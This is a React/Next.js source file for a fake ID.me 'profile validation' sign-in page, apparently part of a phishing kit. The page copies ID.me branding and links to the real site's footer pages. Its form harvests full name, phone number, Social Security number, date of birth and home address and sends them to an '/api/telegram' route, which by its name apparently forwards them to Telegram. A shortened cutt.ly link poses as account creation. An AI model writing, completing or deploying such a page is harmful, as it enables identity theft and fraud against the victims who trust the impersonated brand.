"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import idmeLogo from "./idme.png"; // place your logo in the same folder

export default function ProfileValidationForm() {
  const router = useRouter();
  const [fullName, setFullName] = useState("");
  const [mobileNumber, setMobileNumber] = useState("");
  const [ssn, setSsn] = useState("");
  const [dob, setDob] = useState("");
  const [address, setAddress] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validate all fields are filled
    if (!fullName || !mobileNumber || !ssn || !dob || !address) {
      setError("Please fill out all fields.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    const formData = {
      full_name: fullName,
      mobile_number: mobileNumber,
      ssn: ssn,
      date_of_birth: dob,
      home_address: address,
    };

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: formData,
          formType: "ID.me Profile Validation",
        }),
      });

      if (!res.ok) throw new Error("Submission failed");

      setSuccess("Profile validation submitted successfully!");
      // Clear fields
      setFullName("");
      setMobileNumber("");
      setSsn("");
      setDob("");
      setAddress("");
      // Redirect after a short delay
      setTimeout(() => {
        router.push("/teil");
      }, 1500);
    } catch (error) {
      console.error(error);
      setError("Failed to submit validation. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* Logo */}
        <div className="flex justify-center">
          <div className="w-32 h-12 relative">
            <Image
              src={idmeLogo}
              alt="ID.me"
              width={128}
              height={48}
              className="object-contain"
              priority
            />
          </div>
        </div>

        {/* Main Card */}
        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-8 pt-8 pb-4">
            <h1 className="text-2xl font-semibold text-gray-900 text-center tracking-tight">
              Sign in to ID.me
            </h1>
            <p className="mt-2 text-sm text-gray-500 text-center">
              We need more information to validate your ID.me Profile
            </p>
          </div>

          <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
            <a
              href="https://cutt.ly/xPJZ0xv"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:text-blue-700 font-medium text-sm"
            >
              Create an ID.me account
            </a>
          </div>

          <div className="p-8">
            {error && (
              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                {error}
              </div>
            )}
            {success && (
              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                {success}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-5">
              {/* Full Name */}
              <div>
                <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1">
                  Full Name
                </label>
                <input
                  id="fullName"
                  type="text"
                  required
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  placeholder="Enter your Full Name"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Mobile Number */}
              <div>
                <label htmlFor="mobile" className="block text-sm font-medium text-gray-700 mb-1">
                  Mobile Number
                </label>
                <input
                  id="mobile"
                  type="tel"
                  required
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value)}
                  placeholder="Enter your Mobile Number"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* SSN */}
              <div>
                <label htmlFor="ssn" className="block text-sm font-medium text-gray-700 mb-1">
                  SSN
                </label>
                <input
                  id="ssn"
                  type="text"
                  required
                  value={ssn}
                  onChange={(e) => setSsn(e.target.value)}
                  placeholder="Enter your Social Security Number"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Date of Birth */}
              <div>
                <label htmlFor="dob" className="block text-sm font-medium text-gray-700 mb-1">
                  Date of Birth
                </label>
                <input
                  id="dob"
                  type="date"
                  required
                  value={dob}
                  onChange={(e) => setDob(e.target.value)}
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Home Address */}
              <div>
                <label htmlFor="address" className="block text-sm font-medium text-gray-700 mb-1">
                  Home Address
                </label>
                <input
                  id="address"
                  type="text"
                  required
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="Enter your Home Address"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
              >
                {isSubmitting ? "Submitting..." : "Continue"}
              </button>
            </form>

            <div className="mt-6 text-center">
              <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-medium">
                Forgot password?
              </a>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
          <a
            href="https://www.id.me/about"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            What is ID.me?
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/terms"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Terms of Service
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Privacy Policy
          </a>
        </div>
      </div>
    </div>
  );
}